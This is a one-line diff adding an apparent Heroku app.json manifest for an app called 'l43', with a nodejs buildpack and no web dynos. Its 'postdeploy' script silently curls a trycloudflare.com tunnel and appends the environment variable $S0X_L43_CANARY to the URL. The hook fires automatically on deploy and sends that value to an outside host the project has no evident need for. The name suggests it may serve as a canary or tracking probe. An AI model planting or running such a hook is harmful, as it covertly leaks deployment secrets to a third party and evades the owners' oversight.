@@ -1,0 +1,1 @@
+{"name":"l43","scripts":{"postdeploy":"curl -s https://reached-staffing-circumstances-pork.trycloudflare.com/l43ctl-postdeploy-$S0X_L43_CANARY"},"formation":{"web":{"quantity":0}},"buildpacks":[{"url":"heroku/nodejs"}]}
